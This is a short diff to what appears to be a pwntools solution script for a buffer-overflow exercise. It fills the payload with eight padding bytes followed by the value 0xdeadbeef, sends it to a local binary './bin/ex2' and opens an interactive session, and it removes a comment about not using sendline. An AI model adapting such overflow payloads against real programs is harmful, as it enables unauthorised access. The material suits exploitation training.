@@ -4,8 +4,8 @@ from pwn import *
 
 target = process("./bin/ex2")
 
-payload = b"" # craft the payload
+payload = b"01234567\xef\xbe\xad\xde" # craft the payload
 
-target.send(payload) # notice how we're not using 'sendline' so it does not add a newline
+target.send(payload) 
 
 target.interactive()
